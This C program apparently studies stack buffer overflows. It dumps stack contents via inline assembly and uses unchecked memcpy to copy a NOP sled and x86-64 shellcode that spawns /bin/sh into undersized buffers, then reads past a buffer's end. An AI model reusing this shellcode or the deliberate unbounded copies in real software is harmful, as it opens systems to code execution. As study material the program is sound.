#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>

static unsigned long inline esp()
{
   unsigned long a = 0;
   __asm__ ("\tmov %%rsp, %%rax\n" : "=a"(a) );
   printf("%%rsp %lx\n", a);
   return a;
}
static unsigned long inline ebp()
{
   unsigned long a = 0;
   __asm__ ("\tmov %%rbp, %%rax\n" : "=a"(a) );
   printf("%%rbp %lx\n", a);
   return a;
}

void print_up ( unsigned char * bottom, unsigned char * top) {
  int i;
  unsigned char * val;
  printf("%lx bottom -> %lx top: %ld bytes\n", bottom, top, top-bottom);
  for (i = 0, val = top;  i < top-bottom;  i++, val--) {
    fprintf(stderr, "%02x-%lx-%i\n", *val, val, i);
    printf("%02x", *val);
    if (i % 32 == 31 )  printf("\n");
    else if (i % 8 == 7) printf("  ");
    else if (i % 4 == 3)  printf(" ");
 }
}

void munkle_print(unsigned char * st, unsigned char * bt) {
 int i;
 for (i = 8; i > (st - bt); i--) {
   printf("%02x", bt[i-1]);

 }

}

void fn(char *str)
{
   char buf[32] = {0};
   char *cp = buf;
   unsigned char *sp = (char *)esp();
   unsigned char *bp = (char *)ebp();
   int i;
   for (i = 8; i > (sp - bp); i--) {
      printf("%02x", bp[i-1]);
      if ((255+i) % 32 == 0)
         printf("\n");
      else if ((255+i) % 8 == 0)
         printf("   ");
      else if ((255+i) % 4 == 0)
         printf(" ");
   }
   printf("\n----------------\n");
   munkle_print(sp, bp);
   printf("\n----------------\n");
   print_up(sp, bp);
   printf(" SP+8 to BP-8 \n");
   print_up(sp-8, bp+8);
   printf("\n----------------\n");
   print_up(sp, bp-8);
  
   printf("BP to SP\n");
   print_up(bp, sp);

   while (*str && *str != ' ') {
      *cp++ = *str++;
   }
   for (cp = buf; *cp; cp++) {
      printf("%02x", (unsigned char)*cp);
      if (((unsigned long)cp + 1) % 16 == 0) {
         printf("\n");
      } else if (((unsigned long)cp + 1) % 8 == 0) {
         printf("   ");
      } else if (((unsigned long)cp + 1) % 4 == 0) {
         printf(" ");
      }
   }
   printf("\n");
   printf("%016lx\n", *(unsigned long *)&buf[40]);
}

void fn2(char *str)
{
   char buf[32] = {0};
   char *cp;
   esp();
   memcpy(buf, str, strlen(str));
   for (cp = buf; *cp; cp++) {
      printf("%02x", (unsigned char)*cp);
      if (((unsigned long)cp + 1) % 16 == 0) {
         printf("\n");
      } else if (((unsigned long)cp + 1) % 8 == 0) {
         printf("   ");
      } else if (((unsigned long)cp + 1) % 4 == 0) {
         printf(" ");
      }
   }
   printf("\n");
   printf("%016lx\n", *(unsigned long *)&buf[40]);
}

void fn3(char *str)
{
   char buf = {0};
   char *cp;
   esp();
   memcpy(&buf, str, strlen(str));
   for (cp = &buf; *cp; cp++) {
      printf("%02x", (unsigned char)*cp);
      if (((unsigned long)cp + 1) % 16 == 0) {
         printf("\n");
      } else if (((unsigned long)cp + 1) % 8 == 0) {
         printf("   ");
      } else if (((unsigned long)cp + 1) % 4 == 0) {
         printf(" ");
      }
   }
   printf("\n");
   printf("%016lx\n", *(unsigned long *)&buf);
}

static char str[] = 
   "\x90\x90\x90\x90""\x90\x90\x90\x90"  "\x90\x90\x90\x90""\x90\x90\x90\x90"
   "\x90\x90\x90\x90""\x90\x90\x90\x90"  "\x90\x90\x90\x90""\x90\x90\x90\x90"
   "\x48\x31\xc0\x48""\x31\xd2\x48\x31"  "\xf6\x52\x48\xbf""\x2f\x62\x69\x6e"
   "\x2f\x2f\x73\x68""\x57\x48\x89\xe7"  "\xb0\x3b\x0f\x05";

int main(int argc, char *argv[])
{
   switch(argc) {
   case 1:
      fn(str);
      break;
   case 2:
      fn2(str);
      break;
   case 3:
      fn3(str);
      break;
   default:
      fn(str);
      fn2(str);
   }      
   return 0;
}
